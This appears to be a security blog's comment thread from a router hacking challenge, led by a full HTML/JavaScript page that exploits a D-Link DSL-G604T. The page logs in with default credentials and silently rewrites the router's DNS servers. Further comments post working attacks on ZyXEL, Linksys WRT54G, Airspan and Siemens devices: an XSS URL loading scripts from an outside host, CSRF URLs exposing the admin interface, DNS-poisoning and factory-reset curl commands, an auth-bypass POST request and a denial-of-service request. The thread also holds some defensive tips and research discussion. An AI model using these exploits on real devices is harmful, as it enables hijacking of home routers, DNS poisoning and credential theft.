+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;DLink DSL-G604T Exploit&lt;/title&gt;
+&lt;script&gt;
+function readConfig() {
+	login();
+	setTimeout(function() {
+		xss('"&gt;&lt;iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);"&gt;');
+	}, 2000);
+}
+function xss(payload) {
+	ifrm = document.getElementById('iframe');
+	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/webcm?getpage=../html/advanced/portforw.htm&var:pagename=fwan&var:category='+payload;
+}
+function login() {
+	var f = document.createElement('form');
+	f.action = 'http://192.168.1.1/cgi-bin/webcm';
+	f.innerHTML = '&lt;input type="hidden" name="getpage" value="../html/home.htm"&gt;&lt;input type="hidden" name="errorpage" value="../html/index.html"&gt;';
+	f.innerHTML += '&lt;input type="hidden" name="login:command/username" value="admin"&gt;&lt;input type="hidden" name="login:command/password" value="admin"&gt;';
+	f.innerHTML += '&lt;input type="hidden" name="var:errormsg" value="Error"&gt;';
+	f.target = 'iframe';
+	f.method = 'post';
+	document.body.appendChild(f);
+	f.submit();
+}
+function post(url, fields) {
+	var p = document.createElement('form');
+	p.action = url;
+	p.innerHTML = fields;
+	p.target = 'iframe';
+	p.method = 'post';
+	document.body.appendChild(p);
+	p.submit();	
+}
+function changeDNS(server) {
+	login();
+	setTimeout(function() {
+		var fields = '&lt;input type="hidden" name="getpage" value="../html/setup/dns.htm"&gt;';
+		fields += '&lt;input type="hidden" name="resolver:settings/nameserver1" value="'+server+'"&gt;';
+		fields += '&lt;input type="hidden" name="resolver:settings/nameserver2" value="'+server+'"&gt;';
+		fields += '&lt;input type="hidden" name="dproxy:settings/state" value="2"&gt;';
+		post('http://192.168.1.1/cgi-bin/webcm',fields);
+	}, 2000);
+	setTimeout(function() {
+		post('http://192.168.1.1/cgi-bin/webcm','&lt;input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm"&gt;');
+	},5000);
+}
+window.onload = function() {
+	//readConfig();
+	changeDNS('2.2.2.2');
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe name="iframe" id="iframe"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="meathive"><span>meathive</span><div class="post-comment-content">I apologize for those of you unable to access my demo. My hosting provider has indefinitely shut down kinqpinz.info due to my router hacking post.
+
+I've asked on Ronald's forum but would also like to here, if someone can recommend a hosting provider that doesn't censor its members. I'd like to get back online as soon as possible.
+
+Thank you.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">posted by <a href="http://sla.ckers.org/forum/profile.php?13,577" rel="nofollow">beford</a> on <a href="http://sla.ckers.org/forum/read.php?13,20128,20229#msg-20255" rel="nofollow">sla.ckers.org</a>:
+
+<pre><code>I'm using a ZyXEL P-660HW Series [www.zyxel.com] . There are a lot of CSRF stuff on this router, it can be used to change 
+DNS servers, add keywords to bannedlist on URL, it's also affected by the IP-based session management attacks mentioned on gnucitizen,
+and to authenticate you only need a password, which by default is 'admin', I created two simple proof of concepts abusing a XSS flaw which
+requires the user to be logued on.
+
+hxtp&#58;//192.168.1.1/Forms/DiagGeneral_2?PingIPAddr=d=%3Cscript%20src%3Dhttp:%2f%2fbeford.org%2fstuff%2fr1.js%3E%3C%2fscript%3E
+hxtp&#58;//192.168.1.1/Forms/DiagGeneral_2?PingIPAddr=d=%3Cscript%20src%3Dhttp:%2f%2fbeford.org%2fstuff%2fr2.js%3E%3C%2fscript%3E
+
+Javascript source code, and two screenshots for reference:
+src: <a href="http://beford.org/stuff/r1.js" rel="nofollow">[beford.org]</a> shot: <a href="http://beford.org/stuff/img/r1.png" rel="nofollow">[beford.org]</a>
+src: <a href="http://beford.org/stuff/r2.js" rel="nofollow">[beford.org]</a> shot: <a href="http://beford.org/stuff/img/r2.png" rel="nofollow">[beford.org]</a></code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@loftgaia - you're so right. The vulnerabilties you can find are amazing. Many of these issues wouldn't be foudn on regular web apps these days. However, because embedded devices are very primitive in regards to limited hardware, security is very often sacrificed.
+
+Changing DNS server settings without password! WOW! Through away your Belkin F5D7230-4 ASAP!
+
+I bet you can find many more issues, although at this point you owned your router completely since you proved any webpage can make any changes to it!!! :-)
+
+HTTP and related protocols such as UPnP really are the how hanging fruit of embedded devices security. I can't believe that a router hacking challenge like this one hasn't happened before.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">the router hacking challenge is going pretty well, don't you think :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">meathive, I went through the same experience as well. The best you can do is to get some VPS or a proper server hosting solution, or maybe even consider the options to host things yourself. You might want to check Amazon's Simple Storage service, as it is very reliable and very, very cheap.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@pdp - the challenge really is going great! However, I think it'd be cool to think of it as an "embedded devices hacking challenge", rather than focusing on *routers* only.
+
+Take .mario's super cool VoIP theft hack. It's a great finding but it's on an IP phone rather than a router. We should definitely also promote hacking IP phones, cameras, printers and so on! The more variety, the more colorful the hacks will be!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="v-wall"><span>v-wall</span><div class="post-comment-content">http://blog.v-wall.co.uk/?p=60 - though I would direct any possible readers of my site into the game</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">10x, v-wall</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Jonas"><span>Jonas</span><div class="post-comment-content"><pre><code>I'm using a DLINK-DI604 router which is surely one of the most popular ones here where i live.
+The first thing i tried resulted in an XSS:
+
+http&#58;//192.168.0.1/prim.htm?rc=_&amp;rf="&gt;alert(1)
+
+I'll come back if i notice anything more.</code></pre>
+
+http://pastebin.com/m5ad456b3</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">@Adrian: The Snom phone can be configured to listen on a domain - but won't by default.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="tokumei"><span>tokumei</span><div class="post-comment-content">A little hint for those of you who don't know where to start.. Try running a thorough Nessus scan, once from inside your private network and once from the outside and see what you get.
+
+Usually the results are shocking..</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">@tokumei:
+
+<code>nmap -sP 192.168.0.0/24</code> also does the job and won't take as long a nessus scan ;)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Nothing as fast as ARP scans when you are inside the LAN.
+
+My favorite nmap arp scan command: <code>nmap -n -T5 -sP -PR 192.168.0.0/24</code>
+
+In Cain: Sniffer/Hosts/(Right-click) Scan MAC Addresses</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt=".mario"><span>.mario</span><div class="post-comment-content">@Adrian: Indeed - twice as fast. Nice!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kender"><span>Kender</span><div class="post-comment-content"><pre><code>Device: Zyxel P-2602HW-D1A 
+Description: All-in-one ADSL2+ VoIP IAD for SOHO
+Firmware: V3.40(AJZ.1)
+Default IP: 192.168.1.254
+
+Once you log in your IP is whitelisted for 5 minutes (default value, see below).
+
+There is no CSRF protection.Examples:
+
+http&#58;//192.168.1.254/Forms/RemMagWWW_1?serverWebPort=80&amp;WWWAccessInterface=00000000
+
+will open up the admin web interface to the internet.
+
+http&#58;//192.168.1.254/Forms/rpSysAdmin_1?StdioTimout=0
+
+will set the IP whitelisting timeout to unlimited.
+
+When someone is logged in to the interface, requesting an admin url from a different IP in the LAN produces a
+message stating that the object is Protected. When no-one is logged in you get the login page. Thus it is possible
+to tell when someone is logged in.
+
+Protection:
+- Set the Maintenance &gt; System &gt; General &gt; Administrator Inactivity Timer very low.
+- Make sure you do not access any web resource while administering the device and for x minutes afterwards.</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Kender, 10x for submitting this finding.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nexact"><span>nexact</span><div class="post-comment-content">hello pdp,
+
+I found a way to bypass any authentication in one of   most used WiMax antenna made by Airspan, It's possible to access it without configuring a specific iprange, so depending on how your wimax network is setuped, you may be able to access others antenna.
+
+may I post it right there or it's not considered like a 'router' ? :-)
+
+peace, nex.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">nexact, absolutely. feel free to post that info :)</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@Kender - damnit, you mentioned one of the issues I've covered on a ZyXEL gateway hacking paper I've been working on for some time! :) Although I found the issue in particular on other models. It seems that there is a lot of source code reuse among many ZyXEL models.
+
+Keep the research coming guys!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="nexact"><span>nexact</span><div class="post-comment-content"><pre><code>Device: Airspan WiMax ProST
+Hardware Rev: 4.1
+Software Ver: 6.5.38.0
+Picture: http://tinyurl.com/32vloa
+VulnType: Authentication bypass
+
+There's not a lot of options to configure in this antenna but actually it's possible to "scrap" the antenna by 
+sending a corrupted firmware or you could simply bind it to another WiMax base station.
+
+How to exploit it ? 
+Pretty simple, once you successfully log into the administration panel, it popups a webpage with all settings 
+and a POST forms. Each settings is then accessed by sending a POST request to /process_adv/.
+
+The problem is that /process_adv/* is not validating if an user is authenticated.. so an attacker can access
+any options by forging a POST request.
+
+I've used BurpProxy to find out this one, kinda easy.. Setup your IE proxy to localhost:8080 and run BurpProxy,
+make any type of http request to your antenna and change the request :
+
+POST /process_adv/ HTTP/1.1
+Host: 10.0.0.1
+Keep-Alive: 300
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+DialogText=&amp;Advanced=1
+
+
+I'm currently debugging the firmware to find out if password is stocked in cleartext in the EEPROM. and 
+maybe.. there's a backdoor in it ? :-) Port 23 is open and it runs VxWorks.</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Kender"><span>Kender</span><div class="post-comment-content">Yeah, they almost all run ZyNOS. Stupid thing is that the RomPager embedded webserver they use does support basic auth. I'd like to dig in to the firmware as well, but can't figure out how to load it in IDA :( The telnet interface is interesting as well, even has packet capture abilities.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="meathive"><span>meathive</span><div class="post-comment-content"><pre><code>So with everybody poisoning DNS I may as well add another attack vector against the WRT54G! I've also added how to restore the factory defaults.
+
+############################################################################
+What:
+poison dns.
+dns 1 = 1.2.3.4
+dns 2 = 5.6.7.8
+dns 3 = 9.8.7.6
+
+Where:
+http&#58;//192.168.1.1/Basic.tri?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en
+
+How:
+curl -d "dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en" http&#58;//192.168.1.1/Basic.tri
+############################################################################
+What:
+restore factory defaults.
+
+Where:
+http&#58;//192.168.1.1/factdefa.tri?FactoryDefaults=Yes&amp;layout=en
+
+How:
+curl -d "FactoryDefaults=Yes&amp;layout=en" http&#58;//192.168.1.1/factdefa.tri
+############################################################################</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="diesl0w"><span>diesl0w</span><div class="post-comment-content"><pre><code>There is a configuration disclosure on the D-Link DWL 2100AP that allows for the configuration to be downloaded via web browser.
+
+Making a regular request to any file with the .cfg as an extension: http&#58;///config.cfg
+
+This will give the AP's configuration including admin passwords, encrypted key, allowed MAC's, etc.
+
+Part of the configuration disclosed is below:
+
+# Copyright (c) 2002 Atheros Communications, Inc., All Rights Reserved
+# DO NOT EDIT -- This configuration file is automatically generated
+magic Ar52xxAP
+fwc: 154
+login admin
+DHCPServer 
+Eth_Acl 
+nameaddr 0.0.0.0
+domainsuffix 
+IP_Addr 10.10.10.166
+IP_Mask 255.255.255.0
+Gateway_Addr 10.10.10.1
+RADIUSaddr 
+RADIUSport 1812
+RADIUSsecret 
+password ##EDITED##
+passphrase 
+wlan1 passphrase ##EDITED##
+passphraseKey 00000000000000000000000000000000000000000000000000000000000000000000000000000000
+wlan1 passphraseKey 1b911ae850d9ce61053b0d03ca901f593a776fd514dfc31313506f419a998feadc6fad570a57e58f
+version 2
+rbcnt 86
+
+I disclosed a doc and video of this sometime last year so its not brand new but still interesting!</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@desl0w - very nice auth bypass vulnerability. Perhaps it was reported longer ago than in 2007. These guys published the following advisory in 2006. The only difference in their advisory is that they make the request to the .cfg file under the '/cgi-bin/' directory:
+
+http://www.intruders.org.br/adv0206en.html
+
+Nice find indeed! If you find a XSS, then you can steal that info even if the web console is only enabled on the LAN interface (rather than WAN), by having the victim user visit your evil page!
+
+Just make the XSS payload use the XHR() function to scrape '/blah.cfg' and send it to the attacker's site.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="diesl0w"><span>diesl0w</span><div class="post-comment-content">@Adrian Pastor - Very Nice! I never shined to much light on this but that is definitely an idea worth expressing. I have another ZyXel AP and Linksys Wifi Cam I have been playing with. I noticed the Linksys Cam has telnet open. Is this normal? I have never nmap'd a linksys product until yesterday and noticed it was open.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@diesl0w - some devices come with telnet on by default. i.e.: zyxel prestige gateways. IP cameras-wise I've played with Axis IP cameras, which although support telnet (you need to edit the 'inittab' file), do not have it enabled by default.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="al1us"><span>al1us</span><div class="post-comment-content">I guess all the bugs in the WRT54G are known, but I have just tested this device myself. I have version 7.As it is with other routers, I can change all the device settings without password prompt using post requests.
+
+<code>http&#58;//router_ip/Config.bin</code> has all the passwords and keys in a plain text but you have to be logged in to get that, since the router doesn't allow GET requests without authorization.
+
+One more thing I have found out is that port 21 is open and whether you change the router password or not, the ftp password is always the same: admin and no login. There are some files like nvram.cfg that has the router settings (no passwords), one file with the list of all html pages, one ELF executable which I failed to disassemble - IDA crashes with the following error: "the processor module is prohibited by the key", and few other files. Maybe somebody has more knowledge and can help me with disassembling it.
+
+I can also make DoS and force the router to restart if I login to ftp with very long username and password.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Gembox"><span>Gembox</span><div class="post-comment-content">I have a WRT54GS with firmware v1.52.0.
+
+I can send POST requests to *.tri but the settings won't be changed.  Even though the settings are not modified, I get a Status OK - 200 after the POST request.
+
+I did some tests and so far you must have the Authorization header with the right value to successfully change the settings.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="meathive"><span>meathive</span><div class="post-comment-content">I noticed the same thing on another WRT54G model without wifi...POST requests were similar but no changes succeeded. I also don't have any of the CFG files al1us is talking about, making the attack avenue slim until some code injection is found.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content"><pre><code>Hi guys, the ZyXEL vulnerability research paper is out! 
+
+There are tons of goodies, including persistent XSS via SNMP madness, wardriving over the internet, password leaks via SNMP, 
+auth replay attacks, privilege escalation, etc: http://www.procheckup.com/Hacking_ZyXEL_Gateways.pdf</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">hey ap,
+
+can you post some details here so we keep a log of all these issues :) cheers</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@loftgaia - Googling for <code>/cgi-bin/setup_dns.exe</code> reveals that the exact same auth bypass was reported on a Philips router in Feb 2007: https://bugzilla.mozilla.org/show_bug.cgi?id=371598
+
+I guess both devices, even though they're different brands, they're sharing the same firmware?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="loftgaia"><span>loftgaia</span><div class="post-comment-content">@Adrian -Dunno,anyway here's the link to the firmware im using:
+http://www.belkin.com/support/article/?lid=en&amp;pid=f5d7230-4&amp;aid=5027&amp;scid=0&amp;fid=3805&amp;fn=f5d7230-4v7_us_9.01.10.bin</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content"><pre><code>OK. Here is the summary of the ZyXEL Prestige routers hacking paper:
+
+- persistent JS/HTML injection via SNMP (we thought this is quite cool and potentially a new attack)
+
+- read and write SNMP access enabled by default. btw, there are many ISPs other there that ship Prestige routers with SNMP enabled on WAN (internet visible)!
+
+- privilege escalation from 'user' to 'admin' is possible
+
+- it's possible to extract sensitive information via SNMP read access such as the username and password for the Dynamic DNS service (if such service is enabled of course)
+
+- admin password is MD5-hashed, however no challenge reponse. Therefore, authentication is vulnerable to replay attacks and password cracking (no SSL/TLS is supported by Prestige routers)
+
+- admin sessions can be hijacked, since the user's source IP address is used for authentication which can be trivially spoofed in LAN environments (i.e.: via shared proxy or changing static IP address)
+
+- sensitive data such as passwords, SNMP community strings and WEP keys travels in the clear
+
+We also show how some wireless ZyXEL Prestige gateways can be used as a wardriving tool by using the built-in "wlan scan" command!
+
+Finally, we discuss how attackers can use the owned gateway as a bouncing point to attack machines connected in the internal (LAN) network
+
+For more information, including a wardriving expect script, interesting SNMP OIDs and affected models see:
+
+http://www.procheckup.com/Hacking_ZyXEL_Gateways.pdf</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">btw guys, Kender has been working on a quite neat ZyXEL reverse engineering project. He wrote a tool that allows you to read the admin password from the config file (rom-0) in the clear, which is not possible by default. Sweet!
+
+I'm hoping we will post the details soon!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content"><pre><code>Kender's ZyXEL config file reverse engineering work can be found here: http://www.mindmasters.nl/kender/zyxel/</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="meathive"><span>meathive</span><div class="post-comment-content"><pre><code>A couple new things I've found inside the default configuration file, http://192.168.1.1/Config.bin. The router uses a military NTP server,
+ntp2.usno.navy.mil, for synchronizing time. The device's virtual memory/file system info is located at /mem/pricf/0, which I'm still exploring. The only
+reference I've found in regards to /mem/pricf/0, by the way, is on a Korean site so it's still relatively new territory. By simply viewing the ASCII within 
+Config.bin we can view the administrative user name and password, external and internal IPs, router name, available service configurations, and so on. 
+It becomes more interesting when the device is not left in default mode as more information is available pertaining to what is and isn't left on. The 
+firmware seems to come from a company named Intoto, http://www.intoto.com/company.shtml.
+
+Here is a dump of Config.bin using the default settings:
+
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+WANIPConn1
+----
+admin
+admin
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP                                                                                                                 
+
+I should mention that the external IP was available to me when I dumped Config.bin after making some changes in the Web interface. By default, it is not
+viewable. Here the admin password is 'asdf':
+
+TROC
+/mem/pricf/0
+(c) 2001 Copyright Intoto, Inc
+5VGWJ
+WRT54G
+linksysrouter
+self
+ntp2.usno.navy.mil
+root
+00000000000000
+mirror0
+None
+None
+httpSharenet
+mirror0
+httpSharenet
+httpSubnet
+httpSharenet
+httpSubnet
+19192.168.1.1
+httpSharenet
+httpSubnet
+6868.87.85.98;68.87.69.146
+httpSharenet
+httpSubnet
+hshsd1.co.comcast.net.
+httpSharenet
+httpSubnet
+PPPOE
+PPPOE
+PPTP
+PPTP
+L2TP
+L2TP
+PPPOE
+PPPoE
+Med=vl1,AC=,Fr=Sync
+PPTP
+PPTP
+:M-2:I-0.0.0.0:F-2:B-2
+L2TP
+L2TP
+M:2:P:0.0.0.0:K:0:A:0:F:1:B:0:T:33000:R:33300:Y:555:G:Intoto-Net:U:Intoto-India
+Intoto
+IntotoSoft
+Intoto
+WANIPConn1
+x.x.x.x -- external IP now exists!
+WANIPConn1
+admin
+asdf
+linksys
+long
+default
+langpak_en
+PING
+TFTP
+IMAP
+HTTPS
+SNMP
+NNTP
+POP3
+SMTP
+HTTP
+TELNET
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+RegularNAT1
+DefaultTcp
+DefaultUdp
+DefaultIcmp
+ftpinac
+dnsinac
+hainac
+gatekeeper
+msgudp
+tftp
+pcanywhere
+l2tp
+rtsp554
+rtsp7070
+h323
+msgtcp
+pptp
+n2pe
+cuseeme
+mszone
+CORP
+SELF
+DefPoly
+DefISAKMP
+DefPPTP
+DefL2TP</pre></code></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="ikki"><span>ikki</span><div class="post-comment-content"><pre><code>Hi,
+
+I've just read this post. Several weeks ago, I published an advisory regarding a Wifi AP vulnerability. Basically it is possible to overwrite the "admin" password in memory, thus allowing an attacker to gain access to the web interface and alter configuration parameters.
+
+Here you have the full text: http://www.ikkisoft.com/stuff/SN-2007-02.txt
+
+Cheers,
+Luca "ikki"</pre></code></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">10x ikki</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content"><div class="message">the router hacking challenge is over. however, keep posting your findings as you will a deserved place among all participants.</div></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Here is a quick summary, in no particular order, of the types of
+vulnerabilities we are exhibiting:
+
+<ul>
+<li>authentication bypass</li>
+<li>a-to-c attacks</li>
+<li>csrf (cross-site request forgeries)</li>
+<li>xss (cross-site scripting)</li>
+<li>call-jacking - like making your phone dial numbers or even survey room's sound where the phone resides</li>
+<li>obfuscation/encryption deficiencies</li>
+<li>UPnP, DHCP and mDNS problems - although not officially reported, most devices are affected</li>
+<li>SNMP injection attacks due to poor SNMP creds.</li>
+<li>memory overwrites - well it is possible to overwrite the admin password while being in memory and therefore be able to login as admin</li>
+<li>stealing config files</li>
+<li>cross-file upload attacks - this is within the group of csrf attacks</li>
+<li>remote war-driving - way cool</li>
+<li>factory restore attacks</li>
+<li>information disclosure</li>
+<li>etc, etc, etc</li>
+</ul></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="laurent"><span>laurent</span><div class="post-comment-content"><pre><code>Hi guys. I hope it's not to late! I saw the challenge tonight ... got a look at my old dlink DI-524 and it's pretty sensible ... 
+the login is vulnerable to a local bof , by supplying 4096 chars to the username field. also a large http header with no value crash 
+the webserver.
+
+i have also another wi-fi router siemens speedstream 6520 , these are pretty popular in north america. a quick look at it, tells that 
+there's a local DoS without login required.
+
+Site: 192.168.2.1
+Port: 80
+SSL: No
+
+POST /basehelp_English.htm HTTP/1.1
+Host: 192.168.2.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; Bob)
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Content-Length: 99999999999
+Referer: http://192.168.2.1/navbar.htm
+
